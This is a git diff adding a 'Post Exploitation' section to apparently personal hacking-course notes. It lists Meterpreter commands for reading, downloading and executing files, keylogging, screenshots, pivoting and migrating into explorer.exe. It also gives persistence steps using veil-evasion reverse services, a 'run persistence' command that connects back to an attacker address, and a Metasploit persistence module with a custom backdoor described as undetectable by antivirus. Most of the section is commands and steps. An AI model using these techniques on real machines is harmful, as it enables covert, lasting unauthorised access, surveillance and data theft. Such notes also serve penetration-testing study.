@@ -1149,3 +1149,63 @@ document.head.appendChild(imported);
 - port forwarding on router for port 3000 (beEF listens on port 3000)
 - send request from machine on different network to your publicIP and 3000 port
 - ***DMZ Address*** : forward all the ports to given IP address
+
+# Post Exploitation
+
+- Things can do after gaining access by any method
+- first get a meterpreter session (using client Side or server side attacks)
+- you could:
+  - maintain your access after target removes vulnerable program
+  - download, upload, read files
+  - start keylogger
+  - take screenshot
+  - user target machine as Pivot
+
+## Meterpreter Basics
+
+> help - shows help
+> background - backgrounds current session.
+> sessions -l - lists all sessions.
+> sessions -i - interact with a certain session.
+> sysinfo - displays system info.
+> ipconfig - displays info about interfaces.
+> getuid - shows current user
+> ps - all the process running on target computer
+
+- migrate to a process that is less likely to be closed like explorer.exe
+
+```bash
+migrate explorer_process_id
+```
+
+- **File System Commands**
+
+> pwd - shows current working directory
+> ls - lists files in the current working directory.
+> cd [location] - changes working directory to [location].
+> cat [file] - prints the content of [file] on screen.
+> download [file] - downloads [file].
+> upload [file] - uploads [file].
+> execute -f [file] - executes [file].
+> shell - Drop into a system command shell (command prompt of windows)
+***PS: for more commands run > help***
+
+## Maintaining Access
+
+- we loose connection as target computer restarts machine when we use normal backdoor
+- **Using a veil-evasion**
+  - Rev_http_service
+  - Rev_tcp_service
+  - Use it instead of a normal backdoor.
+  - Or upload and execute from meterpreter
+  - Does not always work
+- **Using persistence module**
+  - *run persistence -h*  inside meterpreter(comes with meterpreter)
+  - run persistence -U -i 20 -p 80 -r your_ip_address
+  - *Detectable by antivirus programs*
+  - it tries to connect after specified time to given address
+- **Using metasploit + veil-evasion → More robust + undetectable by Antivirus**
+  > use exploit/windows/local/persistence
+  > set session [session id]    --> session on which handler is running
+  > set exe::custom [backdoor location]       --> available in advance option : 'show advance'
+  > exploit
